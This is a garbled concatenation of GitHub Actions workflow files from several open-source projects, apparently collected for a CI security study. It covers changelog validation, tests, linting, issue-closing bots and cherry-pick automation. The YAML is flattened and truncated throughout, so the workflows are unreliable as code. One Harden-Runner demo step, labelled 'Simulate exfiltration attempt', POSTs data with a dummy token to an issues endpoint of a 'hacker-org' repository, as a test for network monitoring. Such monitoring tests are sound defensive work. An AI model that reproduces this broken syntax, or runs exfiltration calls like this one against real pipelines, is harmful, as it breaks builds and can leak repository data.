const changedChangesFiles = ${{steps.changelog.outputs.changes_files}};
const changelogChangesPresent = ${{steps.changelog.outputs.changelog}};
const versionChangesPresent = ${{steps.changelog.outputs.version}};

const prLabels = await github.rest.issues.listLabelsOnIssue({
    issue_number: context.issue.number,
    owner: context.repo.owner,
    repo: context.repo.repo
});
const backportLabels = prLabels.data.filter(label => label.name.endsWith("-backport"));
const backportVersions = backportLabels.map(label => label.name.split("-")[0]);

const currentVersionFile = fs.readFileSync("./version/VERSION", "utf-8");
const currentVersionParts = currentVersionFile.split(".");
currentVersionParts.pop();
const currentVersion = currentVersionParts.join(".");

const allVersions = [currentVersion, ...backportVersions]
allVersions.sort((a, b) => {
  const as = a.split(".").map(Number);
  const bs = b.split(".").map(Number);

  if (as[0] !== bs[0]) {
    return as[0] - bs[0];
  }
  
  if (as[1] !== bs[1]) {
    return as[1] - bs[1];
  }
});

const noChangelogNeededLabel = prLabels.data.find(label => label.name === 'no-changelog-needed');
const dependenciesLabel = prLabels.data.find(label => label.name === 'dependencies');

// We want to prohibit contributors from directly changing the CHANGELOG.md, it's 
// generated so all changes will be lost during the release process.
// Therefore we only allow the changelog to change together with the version.
// In very rare cases where we generate changes in the changelog without changing the 
// version we will just ignore this failing check.
if (changelogChangesPresent && !versionChangesPresent) {
    await createOrUpdateChangelogComment("Please don't edit the CHANGELOG.md manually. We use changie to control the Changelog generation, please use `npx changie new` to create a new changelog entry.");
    return;
}

if (dependenciesLabel) {
    return;
}

if (noChangelogNeededLabel) {
    if (changesPresent) {
        await createOrUpdateChangelogComment("Please remove either the 'no-changelog-needed' label or the changelog entry from this PR.");
        return;
    }
    
    // Nothing to complain about, so delete any existing comment
    await createOrUpdateChangelogComment("", true);
    return;
}

// We only want to have a changelog entry for the oldest version this PR will
// land in.
const onlyExpectedChangeVersion = allVersions[0]
const missingChangelogEntry = !changedChangesFiles.some(filePath => filePath.includes("/v"+onlyExpectedChangeVersion+"/"))
const unexpectedChangelogEntry = changedChangesFiles.filter(filePath => !filePath.includes("/v"+onlyExpectedChangeVersion+"/"))


if (missingChangelogEntry) {
    await createOrUpdateChangelogComment(`Currently this PR would target a v${onlyExpectedChangeVersion} release. Please add a changelog entry for in the .changes/v${onlyExpectedChangeVersion} folder, or discuss which release you'd like to target with your reviewer. If you believe this change does not need a changelog entry, please add the 'no-changelog-needed' label.`);
    return;
}

if (unexpectedChangelogEntry.length > 0) {
    await createOrUpdateChangelogComment(`Please remove the changelog entry for the following paths: ${unexpectedChangelogEntry.join(", ")}. If you believe this change does not need a changelog entry, please add the 'no-changelog-needed' label.`);
    return;
}

// Nothing to complain about, so delete any existing comment
await createOrUpdateChangelogComment("", true);
name: " ...  entry"Validate changie fragment is validValidat ... s validminiscruff/changie-action@6dcc2533cac0495148ed4046c438487e4dceaa23miniscr ... dceaa23merge -u "." --dry-runmerge - ... dry-runname: V ... s valid- name: ...  files"name: " ...  Entry"check-c ... -entry:name: Changelog/home/huawei/github-actions-security/.github/workflows/hashicorp_terraform__checks.ymlQuick Checksunit-testsUnit Tests"Unit Tests"Fetch source code"Fetch source code"name: " ... e code"${{ steps.go.outputs.version }}go.sumUnit tests"Unit tests"# We run tests for all packages from all modules in this repository.
for dir in $(go list -m -f '{{.Dir}}' github.com/hashicorp/terraform/...); do
    (cd $dir && go test -cover "./...")
done
name: "Unit tests"- name: ... e code"name: "Unit Tests"race-testsRace Tests"Race Tests"Race detector"Race detector"go test -race ./internal/terraform ./internal/command ./internal/states
name: " ... tector"name: "Race Tests""End-to-end Tests"End-to-end tests"End-to-end tests"TF_ACC=1 go test -v ./internal/command/e2etest
name: " ...  tests"name: " ...  Tests"consistency-checksCode Consistency Checks"Code C ... Checks"fetch-d ... branch.go.mod and go.sum consistency check"go.mod ...  check"make syncdeps
CHANGED="$(git status --porcelain)"
if [[ -n "$CHANGED" ]]; then
  git diff
  echo >&2 "ERROR: go.mod/go.sum files are not up-to-date. Run 'make syncdeps' and then commit the updated files."
  echo >&2 $'Affected files:\n'"$CHANGED"
  exit 1
fi
name: " ...  check"Cache protobuf toolsactions/cache@5a3ec84eff668545956fd18022155c47e93e2684tools/protobuf-compile/.workdir"tools/ ... orkdir"protobuf-tools-${{ hashFiles('tools/protobuf-compile/protobuf-compile.go') }}protobu ... go') }}protobuf-tools-
path: " ... orkdir"name: C ... f toolsCode consistency checks"Code c ... checks"make fmtcheck importscheck vetcheck copyright generate staticcheck exhaustive protobuf
if [[ -n "$(git status --porcelain)" ]]; then
  echo >&2 "ERROR: Generated files are inconsistent. Run 'make generate' and 'make protobuf' locally and then commit the updated files."
  git >&2 status --porcelain
  exit 1
fi
name: " ... checks"name: " ... Checks"unit-tests:name: Quick Checks/home/huawei/github-actions-security/.github/workflows/hashicorp_terraform__equivalence-test-diff.ymlequivalence-test-diffequival ... st-diffEquivalence Test Diff"Equiva ... t Diff"name: F ... ce codeDownload testing frameworkDownloa ... amework./.github/scripts/equivalence-test.sh download_equivalence_test_binary \
  0.5.0 \
  ./bin/equivalence-tests \
  linux \
  amd64
name: D ... ameworkBuild terraform./.github/scripts/equivalence-test.sh build_terraform_binary ./bin/terraform./.gith ... rraformRun equivalence testsRun equ ... e testsequivalence-testsbash {0}./bin/equivalence-tests diff \
    --tests=testing/equivalence-tests/tests \
    --goldens=testing/equivalence-tests/outputs \
    --binary=$(pwd)/bin/terraform
echo "exit-code=$?" >> "${GITHUB_OUTPUT}"
Equivalence tests failedEquival ...  failedsteps.equivalence-tests.outputs.exit-code == 1steps.e ... de == 1gh pr comment ${{ github.event.pull_request.number }} \
  --body "The equivalence tests failed. Please investigate [here](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})."
exit 1 # fail the job
name: E ...  failedEquivalence tests changedEquival ... changedsteps.equivalence-tests.outputs.exit-code == 2steps.e ... de == 2gh pr comment ${{ github.event.pull_request.number }} \
  --body "The equivalence tests will be updated. Please verify the changes [here](${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }})."
name: E ... changed- name: ... ce codename: " ... t Diff"equival ... t-diff:name: e ... st-diff/home/huawei/github-actions-security/.github/workflows/hashicorp_terraform__equivalence-test-manual-update.ymlequivalence-tests-manualequival ... -manualtarget-branchWhich branch should be updated?"Which  ... dated?"new-branchName of new branch to be created for the review."Name o ... eview."equivalence-test-versionequival ... versionEquivalence testing framework version to use (no v prefix, eg. 0.5.0).'Equiva ... .5.0).'0.5.0"0.5.0"target-branch:run-equivalence-testsrun-equ ... e-tests"Run eq ...  tests"${{ inputs.target-branch }}${{ inp ... anch }}ref: ${ ... anch }}./.github/actions/equivalence-test./.gith ... ce-testtarget-equivalence-test-versiontarget- ... version${{ inputs.equivalence-test-version }}target-oscurrent-branch${{ inputs.new-branch }}reviewersmessageUpdate equivalence test golden files."Update ... files."target- ... sion }}uses: . ... ce-testrun-equ ... -tests:name: e ... -manual/home/huawei/github-actions-security/.github/workflows/hashicorp_terraform__equivalence-test-update.ymlequivalence-test-updateequival ... -update[ closed ]types: [ closed ]Should run equivalence tests?"Should ... tests?"should_run${{ steps.target_branch.outputs.should_run }}${{ ste ... _run }}should_ ... _run }}merged='${{ github.event.pull_request.merged }}'
target_branch='${{ github.event.pull_request.base.ref }}'

targets_release_branch=false
if [ "$target_branch" == "main" ]; then
  targets_release_branch=true
elif [ "$target_branch" =~ ^v[0-9]+\.[0-9]+$ ]; then
  targets_release_branch=true
fi

should_run=false
if [ "$merged" == "true" ] && [ "$targets_release_branch" == "true" ]; then
  should_run=true
fi

echo "should_run=$should_run" >> ${GITHUB_OUTPUT}
name: target_branch- name: ... _branchname: " ... tests?"- checkneeds.check.outputs.should_run == 'true'needs.c ...  'true'equivalence-testing/${{ github.event.pull_request.head.ref }}equival ... .ref }}${{ github.event.pull_request.merged_by.login }}Update equivalence test golden files after ${{ github.event.pull_request.html_url }}."Update ... rl }}."target- ... : 0.5.0name: e ... -update/home/huawei/github-actions-security/.github/workflows/hashicorp_terraform__issue-comment-created.ymlIssue Comment Created TriageIssue C ...  Triageissue_comment_triagestale
waiting-reply
- uses: ...  v1.3.0issue_c ... triage:name: I ...  Triage/home/huawei/github-actions-security/.github/workflows/hashicorp_terraform__lock.ymlLock Threads'Lock Threads'50 1 * * *'50 1 * * *'cron: '50 1 * * *'- cron: '50 1 * * *'lockdessant/lock-threads@1bf7ec25051fe7c00bdd17e6a7cf3d7bfb7dc771dessant ... b7dc771process-onlyissues, prs'issues, prs'issue-commentI'm going to lock this issue because it has been closed for _30 days_ â³. This helps our maintainers find and focus on the active issues.
If you have found a problem that seems similar to this, please open a new issue and complete the issue template so we can capture all the details necessary to investigate further.
issue-inactive-days'30'pr-commentI'm going to lock this pull request because it has been closed for _30 days_ â³. This helps our maintainers find and focus on the active contributions.
If you have found a problem that seems related to this change, please open a new issue and complete the issue template so we can capture all the details necessary to investigate further.
pr-inactive-daysprocess ... s, prs'uses: d ...  v5.0.1- uses: ...  v5.0.1lock:name: 'Lock Threads'/home/huawei/github-actions-security/.github/workflows/hashicorp_terraform__main.ymlBackport Assistant RunnerBackpor ...  Runnercontent ...  branchhashicorpdev/backport-assistant:0.4.7@sha256:36f9d4fba82b9454f1f62bf76c8078fafe3ab0be71356cb96af6d56ac4482cd8hashico ... 4482cd8Run Backport AssistantRun Bac ... sistantbackport-assistant backport
BACKPORT_LABEL_REGEXPBACKPOR ... _REGEXP(?P<target>\d+\.\d+)-backport"(?P<ta ... ckport"BACKPORT_TARGET_TEMPLATEBACKPOR ... EMPLATEv{{.target}}"v{{.target}}"BACKPORT_CREATE_DRAFT_ALWAYSBACKPOR ... _ALWAYSBACKPOR ... ckport"name: R ... sistant- name: ... sistantbackport:name: B ...  Runner/home/huawei/github-actions-security/.github/workflows/hosted-file-monitor-with-hr.ymlHosted: File Monitoring with Harden-Runner"Hosted ... Runner"uses: s ... nner@v2madhead/semver-utils@latestmadhead ... @latest1.2.3version: 1.2.3uses: m ... @latest- uses: ... nner@v2/home/huawei/github-actions-security/.github/workflows/hosted-file-monitor-without-hr.ymlHosted: File Monitoring without Harden-Runner/home/huawei/github-actions-security/.github/workflows/hosted-https-monitoring-hr.ymlHosted: HTTPS Monitoring with Harden-RunnerJasonEtco/create-an-issue@v2JasonEt ... ssue@v2uses: J ... ssue@v2Simulate exfiltration attemptSimulat ... attemptcurl -X POST -H "Authorization: token 123" \
-H "Accept: application/vnd.github.v3+json" \
https://api.github.com/repos/hacker-org/test-repo/issues \
-d '{"title":"Issue Title","body":"Issue description goes here."}'
name: S ... attempt/home/huawei/github-actions-security/.github/workflows/hosted-network-filtering-hr.ymlHosted: Network Filtering with Harden-Runnerghcr.io:443 github.com:443 registry.npmjs.org:443 www.githubstatus.com:443
/home/huawei/github-actions-security/.github/workflows/hosted-network-monitoring-hr.ymlHosted: Network Monitoring with Harden-Runnerstep-security/harden-runner@95691d3d1cfc1f403f673ccbe70465d7c4254108step-se ... 4254108uses: s ... 4254108- uses: ... 4254108/home/huawei/github-actions-security/.github/workflows/hosted-network-without-hr.ymlHosted: Network Monitoring without Harden-Runner- uses: ... atus@v4/home/huawei/github-actions-security/.github/workflows/ibm_sarama__apidiff.ymlAPI Compatibility**/*.md'**/*.md'- '**/*.md'**"**"- "**"${{ startsWith(github.ref, 'refs/pull/') }}${{ sta ... l/') }}content ... ch codeGOTOOLCHAINlocalGOTOOLCHAIN: localapidiffgithub.base_refSetup Gogo-version: stablename: Setup GoAdd GOBIN to PATHecho "$(go env GOPATH)/bin" >>$GITHUB_PATHInstall apidiff cmdgo install golang.org/x/exp/cmd/apidiff@v0.0.0-20231006140011-7918f672742dgo inst ... 672742dname: I ... iff cmdCheckout base code"base"ref: ${ ... _ref }}name: C ... se codeCapture apidiff baselineCapture ... aselineapidiff -m -w ../baseline.bin .apidiff ... e.bin .name: C ... aselineCheckout updated codeCheckou ... ed codeupdated"updated"path: "updated"name: C ... ed codeRun apidiff checkapidiff -m -incompatible ../baseline.bin .name: R ... f check- name: Setup Goapidiff:name: A ... ibility/home/huawei/github-actions-security/.github/workflows/ibm_sarama__cache-cleanup.ymlCleanup caches on PR close/mergeCleanup ... e/mergeactions ... agementDelete Cachesrefs/pull/${{ github.event.pull_request.number }}/mergegh cache list --ref "$BRANCH" --limit 100
CACHE_KEYS="$(gh cache list --ref "$BRANCH" --limit 100 --json id --jq '.[].id')"
for KEY in ${CACHE_KEYS}; do
  echo "Deleting cache $KEY for ref $BRANCH"
  gh cache delete "$KEY" || true
  echo
done
name: Delete Caches- name: ...  Cachesname: C ... e/merge/home/huawei/github-actions-security/.github/workflows/ibm_sarama__ci.ymlLinting with Go ${{ matrix.go-version }}Linting ... sion }}[stable]go-version: [stable]${{ matrix.go-version }}StaticcheckBUILDTAGSfunctional"functional"v0.6.0"v0.6.0"BUILDTA ... tional"go install "honnef.co/go/tools/cmd/staticcheck@${VERSION}"
echo "::add-matcher::./.github/actions/staticcheck-matchers.json"
$(go env GOPATH)/bin/staticcheck -tags "${BUILDTAGS}" ./...
name: Staticcheckgolangci-lintGOFLAGS-tags=functionalGOFLAGS ... ctionalgolangci/golangci-lint-action@4afd733a84b1f43292c63897423277bb7f4313a9golangc ... f4313a9v2.1.6version: v2.1.6name: golangci-lintUnit Testing with Go ${{ matrix.go-version }}Unit Te ... sion }}oldstable[oldstable, stable]go-vers ... stable]-trimpathDEBUG: trueTest (Unit)name: Test (Unit)name: U ... sion }}/home/huawei/github-actions-security/.github/workflows/ibm_sarama__codeql-analysis.yml39 12 * * 1"39 12 * * 1"cron: "39 12 * * 1"- cron: ...  * * 1"actions ... actions"actions""go"["actions", "go"]languag ... , "go"]github/codeql-action/init@ff0a06e83cb2de871e5a09832bc6a81e7276941fgithub/codeql-action/autobuild@ff0a06e83cb2de871e5a09832bc6a81e7276941fgithub/codeql-action/analyze@ff0a06e83cb2de871e5a09832bc6a81e7276941f/home/huawei/github-actions-security/.github/workflows/ibm_sarama__dependency-review.ymlDependency Review'Dependency Review'dependency-reviewCheckout Repository'Checko ... sitory'actions/dependency-review-action@da24556b548a50705dd671f47852072ea4c105d9actions ... 4c105d9name: ' ... Review'dependency-review:/home/huawei/github-actions-security/.github/workflows/ibm_sarama__fuzz.ymlFuzzingFuzzGOFLAGS: -trimpathRun any fuzzing testsRun any ... g testsgo test -list . | grep '^Fuzz' | parallel 'go test -v -run=^{}$ -fuzz=^{}$ -fuzztime=5m'go test ... ime=5m'name: R ... g testsname: Fuzzname: Fuzzing/home/huawei/github-actions-security/.github/workflows/ibm_sarama__fvt-main.ymlFVT (main)fvtTest with Kafka ${{ matrix.kafka-version }}Test wi ... sion }}kafka-version1.0.22.0.12.2.22.6.32.8.23.0.23.3.23.6.23.8.14.0.0[1.0.2, ...  4.0.0]scala-version2.11kafka-version: 1.0.22.12kafka-version: 2.0.1kafka-version: 2.2.2kafka-version: 2.6.3kafka-version: 2.8.2kafka-version: 3.0.22.13kafka-version: 3.3.2kafka-version: 3.6.2kafka-version: 3.8.1kafka-version: 4.0.0- kafka ... : 1.0.2./.github/workflows/fvt.yml./.gith ... fvt.yml${{ matrix.kafka-version }}${{ matrix.scala-version }}name: T ... sion }}fvt:name: FVT (main)/home/huawei/github-actions-security/.github/workflows/ibm_sarama__fvt-pr.ymlFVT (PR)name: FVT (PR)/home/huawei/github-actions-security/.github/workflows/ibm_sarama__fvt.ymlFVTgo-version:${{ github.workflow }}-kafka-${{ inputs.kafka-version}}-${{ github.ref }}Test with Kafka ${{ inputs.kafka-version }}KAFKA_VERSION${{ inputs.kafka-version }}SCALA_VERSION${{ inputs.scala-version }}Setup Dockerdocker/setup-buildx-action@b5ca514318bd6ebac0fb2aedd5d36ec1b5c232a2docker/ ... 5c232a2buildxname: Setup DockerBuild FVT Docker ImageBuild F ... r Imagedocker/bake-action@212c36739681a6271d58dcfe0d001d2ad13f8e75docker/ ... 13f8e75builder${{ steps.buildx.outputs.name }}docker-compose.ymltargetskafka-1set*.cache-from=type=gha,scope=fvt-kafka-${{ inputs.kafka-version }}
*.cache-to=type=gha,scope=fvt-kafka-${{ inputs.kafka-version }},mode=max
builder ... name }}name: B ... r ImageSetup Docker Composecurl --fail -sSL "https://github.com/docker/compose/releases/download/v2.32.1/docker-compose-$(uname -s)-$(uname -m)" -o /tmp/docker-compose
mkdir -p $HOME/.docker/cli-plugins
install -m755 /tmp/docker-compose $HOME/.docker/cli-plugins
docker version --format 'Docker Engine version v{{.Server.Version}}'
docker compose version
name: S ... ComposeTest (Functional)nohup sudo tcpdump -i lo -w "fvt-kafka-${KAFKA_VERSION}.pcap" portrange 29091-29095 >/dev/null 2>&1 &
echo $! >tcpdump.pid
make test_functional
echo "## Code Coverage" >>$GITHUB_STEP_SUMMARY
echo "|Filename|Function|Coverage|" >>$GITHUB_STEP_SUMMARY
echo "|--------|--------|--------|" >>$GITHUB_STEP_SUMMARY
go tool cover -func=profile.out | sed -E -e 's/[[:space:]]+/|/g' -e 's/$/|/g' -e 's/^/|/g' >>$GITHUB_STEP_SUMMARY
name: T ... tional)Stop tcpdumpif [ -f "tcpdump.pid" ]; then sudo kill "$(cat tcpdump.pid)" || true; fi
if [ -f "fvt-kafka-${KAFKA_VERSION}.pcap" ]; then sudo chmod a+r "fvt-kafka-${KAFKA_VERSION}.pcap"; fi
name: Stop tcpdumpUpload pcap filefvt-kafka-${{ inputs.kafka-version }}.pcapfvt-kaf ... }}.pcapname: f ... }}.pcapname: U ... ap filename: FVT/home/huawei/github-actions-security/.github/workflows/ibm_sarama__i386.ymli386atomicalignstaticcheckGOARCH: 386git clone --depth=1 https://github.com/dominikh/go-tools /tmp/go-tools
( cd /tmp/go-tools/cmd/staticcheck && go build -o /tmp/staticcheck )
/tmp/staticcheck -checks SA1027 ./...
name: staticcheckatomicalign:name: i386/home/huawei/github-actions-security/.github/workflows/ibm_sarama__scorecard.yml17 4 * * 5'17 4 * * 5'cron: '17 4 * * 5'- cron: '17 4 * * 5'/home/huawei/github-actions-security/.github/workflows/ibm_sarama__stale.ymlStale issues and PRs"Stale  ... nd PRs"0 */2 * * *"0 */2 * * *"cron: "0 */2 * * *"- cron: ...  * * *"Thank you for taking the time to raise this issue. However, it has not had any activity on it in the past 90 days and will be closed in 30 days if no updates occur.
Please check if the main branch has already resolved the issue since it was raised. If you believe the issue is still valid and you would like input from the maintainers then please comment to ask for it to be reviewed.Thank you for your contribution! However, this pull request has not had any activity in the past 90 days and will be closed in 30 days if no updates occur.
If you believe the changes are still valid then please verify your branch has no conflicts with main and rebase if needed. If you are awaiting a (re-)review then please let us know.stale/exempt,pinned"stale/ ... pinned"ascending: true- uses: ...  v9.1.0name: " ... nd PRs"/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__accept-baselines-fix-lints.yamlAccept Baselines and Fix LintsAccept  ... x Lintsworkflo ... tch: {}${{ secrets.TS_BOT_GITHUB_TOKEN }}'lts/*'node-ve ... 'lts/*'uses: a ...  v4.4.0Configure Git, Run Tests, Update Baselines, Apply FixesConfigu ... y Fixesgit config user.email "typescriptbot@microsoft.com"
git config user.name "TypeScript Bot"
npm ci
git rm -r --quiet tests/baselines/reference
npx hereby runtests-parallel --ci --fix || true
npx hereby baseline-accept
git add ./src
git add ./tests/baselines/reference
git diff --cached
git commit -m "Update Baselines and/or Applied Lint Fixes"
git push
name: C ... y Fixesname: A ... x Lints/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__ci.yml- ubuntu-latest'22''16''14'- '22'bundle- 'true'- node- ... 'lts/*'node-version: '14'- node-version: '14'Test Node ${{ matrix.node-version }} on ${{ matrix.os }}${{ (!matrix.bundle && ' with --no-bundle') || '' }}Test No ... | '' }}Use node version ${{ matrix.node-version }}Use nod ... sion }}npm run test -- --no-lint --bundle=${{ matrix.bundle }}npm run ... ndle }}Print baseline diff on failurePrint b ... failure${{ failure() && steps.test.conclusion == 'failure' }}${{ fai ... ure' }}npx hereby baseline-accept
git add tests/baselines/reference
git diff --staged --exit-code
coverage'self-hosted'1ES.Pool=TypeScript-1ES-GitHub-Large'1ES.Po ... -Large'1ES.ImageOverride=mariner-2.0'1ES.Im ... er-2.0'- 'self-hosted'Run tests with coverageRun tes ... overagenpm test -- --no-lint --coveragenpm tes ... overagename: R ... overageUpload coverage artifactUpload  ... rtifactname: coveragename: U ... rtifactcodecov/codecov-action@ad3126e916f78f00edff4ed0317cf185271ccc2dcodecov ... 71ccc2duse_oidc${{ !(github.event_name == 'pull_request' && github.event.pull_request.head.repo.fork) }}${{ !(g ... ork) }}disable_search./coverage/codecov.json./cover ... ov.jsonuse_oid ... ork) }}uses: c ...  v5.4.2runs-on:Lintername: LinterknipUnused exportsnpm run knipname: Unused exports~/.cache/dprint${{ runner.os }}-dprint-${{ hashFiles('package-lock.json', '.dprint.jsonc') }}${{ run ... nc') }}${{ runner.os }}-dprint-
path: ~ ... /dprintuses: a ...  v4.2.3Check formattingnpx dprint checkname: C ... mattingbrowser-integrationInstalling browsersname: I ... rowsersValidate the browser can import TypeScriptValidat ... eScriptnpx hereby test-browser-integrationnpx her ... grationname: V ... eScripttypecheckBuild srcnpx hereby build-srcname: Build srcsmokenpm --version
# corepack enable npm
npm install -g $(jq -r '.packageManager' < package.json)
npm --version
npx hereby lkgrun: npx hereby lkgnode ./scripts/addPackageJsonGitHead.mjs package.json
npm pack
mv typescript*.tgz typescript.tgz
echo "package=$PWD/typescript.tgz" >> "$GITHUB_OUTPUT"
packSmoke testcd "$(mktemp -d)"
npm init --yes
npm install ${{ steps.pack.outputs.package }}

echo "Testing tsc..."
npx tsc --version

echo "Testing tsserver..."
echo '{"seq": 1, "command": "status"}' | npx tsserver

node $GITHUB_WORKSPACE/scripts/checkModuleFormat.mjs typescript
node $GITHUB_WORKSPACE/scripts/checkModuleFormat.mjs typescript/lib/tsserverlibrary
name: Smoke testpackage-sizeprpath: prpath: basenpm --version
# corepack enable npm
npm install -g $(jq -r '.packageManager' < package.json)
npm --version
./pr./baseecho "See $GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID for more info."
node ./pr/scripts/checkPackageSize.mjs ./base ./pr >> $GITHUB_STEP_SUMMARY
miscBuild scriptsnpx hereby scriptsname: Build scriptsESLint testsnpx hereby run-eslint-rules-testsnpx her ... s-testsname: ESLint testsself-checkBuild tscnpx hereby tscname: Build tscCleannpx hereby clean-srcname: CleanSelf buildnpx hereby build-src --builtnpx her ... --builtname: Self buildbaselinesRemove all baselinesrm -rf tests/baselines/referencerm -rf  ... ferencename: R ... selinesnpm test &> /dev/null || exit 0npm tes ...  exit 0Accept baselinesnpx hereby baseline-accept
git add tests/baselines/reference
name: A ... selinesCheck baselinescheck-baselinesfunction print_diff() {
  if ! git diff --staged --exit-code --quiet --diff-filter=$1; then
    echo "$2:"
    git diff --staged --name-only --diff-filter=$1
  fi
}

if ! git diff --staged --exit-code --quiet; then
  print_diff ACR "Missing baselines"
  print_diff MTUXB "Modified baselines"
  print_diff D "Unused baselines"
  git diff --staged > fix_baselines.patch
  exit 1
fi
name: C ... selinesUpload baseline diff artifact${{ failure() && steps.check-baselines.conclusion == 'failure' }}fix_baselines.patchname: f ... s.patch/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__close-issues.ymlClose issuesgithub.repository == 'microsoft/TypeScript'github. ... Script'content ...  issuesDATE=$(date --date='2 days ago' --iso-8601)

close_issues() {
  echo "Closing issues marked as '$1'."
  for issue in $(gh issue list --limit 100 --label "$1" --repo ${{ github.repository }} --state open --search "updated:<$DATE" --json number --jq '.[].number'); do
    echo "Closing https://github.com/${{ github.repository }}/issues/$issue"
    gh issue close $issue --repo ${{ github.repository }} --reason "not planned" --comment "This issue has been marked as \"$1\" and has seen no recent activity. It has been automatically closed for house-keeping purposes."
  done
}

close_issues "Duplicate"
close_issues "Unactionable"
close_issues "Not a Defect"
close_issues "External"
close_issues "Working as Intended"
close_issues "Question"
close_issues "Out of Scope"
close_issues "Declined"
close_issues "Won't Fix"
close_issues "Too Complex"
close_issues "Design Limitation"
name: Close issues- name: Close issues/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__codeql.ymlCode Scanning - Action'Code S ... Action'github/codeql-action/init@45775bd8235c68ba998cffa5171334d58593da47github/ ... 593da47./.github/codeql/codeql-configuration.yml./.gith ... ion.ymlconfig- ... ion.ymlgithub/codeql-action/autobuild@45775bd8235c68ba998cffa5171334d58593da47github/codeql-action/analyze@45775bd8235c68ba998cffa5171334d58593da47name: ' ... Action'/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__create-cherry-pick-pr.ymlCreate cherry pick PRCreate  ... pick PRPR number to cherry-pickPR numb ... ry-pickdescrip ... ry-pickTarget branch to cherry-pick toTarget  ... pick todescrip ... pick todistinct_id(bot) A distinct ID'(bot)  ... nct ID'descrip ... nct ID'source_issue(bot) The issue that triggered this workflow'(bot)  ... rkflow'descrip ... rkflow'requesting_user(bot) The user who requested this workflowstatus_comment(bot) The comment to update with the status of this workflowpr:run-name${{ github.workflow }}${{ inputs.distinct_id && format(' (bot run {0})', inputs.distinct_id) || '' }}${{ git ... | '' }}open-prblob:nonefilter: ... -clone/${{ inputs.pr }}${{ inputs.target_branch }}DISTINCT_ID${{ inputs.distinct_id }}${{ inp ... t_id }}SOURCE_ISSUE${{ inputs.source_issue }}${{ inp ... ssue }}REQUESTING_USER${{ inputs.requesting_user }}${{ inp ... user }}STATUS_COMMENT${{ inputs.status_comment }}PR: ${{ inputs.pr }}retriesconst {
  PR,
  TARGET_BRANCH,
  DISTINCT_ID,
  SOURCE_ISSUE,
  REQUESTING_USER,
  STATUS_COMMENT,
} = process.env;

const pr = await github.rest.pulls.get({
  owner: context.repo.owner,
  repo: context.repo.repo,
  pull_number: +PR,
});

if (!pr.data.merge_commit_sha) throw new Error("No merge commit sha found");

const pickBranch = `cherry-pick/${PR}/${TARGET_BRANCH}`;

const title = `ðŸ¤– Pick PR #${PR} (${pr.data.title.substring(0, 35)}${pr.data.title.length > 35 ? "..." : ""}) into ${TARGET_BRANCH}`;

await exec.exec("git", ["config", "user.email", "typescriptbot@microsoft.com"]);
await exec.exec("git", ["config", "user.name", "TypeScript Bot"]);
await exec.exec("git", ["switch", "--detach", `origin/${TARGET_BRANCH}`]);
await exec.exec("git", ["switch", "-c", pickBranch]);

let updatedBaselinesMessage = "";
try {
  await exec.exec("git", ["cherry-pick", "-m", "1", pr.data.merge_commit_sha]);
} catch (e) {
  console.log(e);

  // The cherry-pick failed. If all of the conflicts are in tests/baselines,
  // try to run the tests and accept the new baselines.

  await exec.exec("git", ["add", "tests/baselines"]);
  // This will fail if any other files were modified.
  await exec.exec("git", ["-c", "core.editor=true", "cherry-pick", "--continue"]);

  await exec.exec("npm", ["ci"]);

  try {
    await exec.exec("npm", ["test", "--", "--no-lint"]);
  } catch {
    // Expected to fail.
  }

  await exec.exec("npx", ["hereby", "baseline-accept"]);
  await exec.exec("git", ["add", "tests/baselines"]);
  await exec.exec("git", ["commit", "-m", "Update baselines"]);

  updatedBaselinesMessage = " This involved updating baselines; please check the diff.";
}

await exec.exec("git", ["push", "--force", "--set-upstream", "origin", pickBranch]);

const existingPulls = await github.rest.pulls.list({
  owner: context.repo.owner,
  repo: context.repo.repo,
  head: `${context.repo.owner}:${pickBranch}`,
});

let commentBody;

if (existingPulls.data.length === 0) {
  console.log(`No existing PRs found for ${pickBranch}`);

  const body = `This cherry-pick was triggered by a request on #${PR}.\n\nPlease review the diff and merge if no changes are unexpected.${updatedBaselinesMessage}`;

  const newPr = await github.rest.pulls.create({
    owner: context.repo.owner,
    repo: context.repo.repo,
    base: TARGET_BRANCH,
    head: pickBranch,
    title,
    body,
  });

  await github.rest.issues.addAssignees({
    owner: context.repo.owner,
    repo: context.repo.repo,
    issue_number: newPr.data.number,
    assignees: ["DanielRosenwasser"],
  });

  await github.rest.pulls.requestReviewers({
    owner: context.repo.owner,
    repo: context.repo.repo,
    pull_number: newPr.data.number,
    reviewers: ["DanielRosenwasser", REQUESTING_USER],
  });

  commentBody = `I've created #${newPr.data.number} for you.${updatedBaselinesMessage}`;
}
else {
  const existing = existingPulls.data[0];
  console.log(`Found existing PR #${existing.number} for ${pickBranch}`);

  await github.rest.pulls.update({
    owner: context.repo.owner,
    repo: context.repo.repo,
    pull_number: existing.number,
    title,
  });

  commentBody = `I've updated #${existing.number} for you.${updatedBaselinesMessage}`;
}

return commentBody;
retries: 3uses: a ...  v7.0.1microsoft/typescript-bot-test-triggerer/.github/actions/post-workflow-result@mastermicroso ... @master${{ !cancelled() && inputs.distinct_id }}${{ !ca ... t_id }}success_comment${{ steps.open-pr.outputs.result }}failure_commentI was unable to cherry-pick this PR.'I was  ... is PR.'success ... sult }}uses: m ... @masteropen-pr:name: C ... pick PR/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__error-deltas-watchdog.yamltypescript-error-deltas Watchdog'typesc ... tchdog''0 0 * * 3'cron: ' ... dnesday- cron: ... dnesdaycheck-for-recentTAGS@navya9singh @RyanCavanaugh @DanielRosenwasser'@navya ... wasser'NewErrorsDATE=$(date --date="7 days ago" --iso-8601)
gh issue list --repo microsoft/typescript --search "[NewErrors] created:>=$DATE" --state all --json number --jq ".[].number" \
| grep -qe "[0-9]" \
|| gh issue create --repo ${{ github.repository }} --title "No NewErrors issue since $DATE" --body "$TAGS Please check the [pipeline](https://typescript.visualstudio.com/TypeScript/_build?definitionId=48)."
| # --j ...  outputname: NewErrorsServerErrors TSDATE=$(date --date="7 days ago" --iso-8601)
gh issue list --repo microsoft/typescript --search "[ServerErrors][TypeScript] created:>=$DATE" --state all --json number --jq ".[].number" \
| grep -qe "[0-9]" \
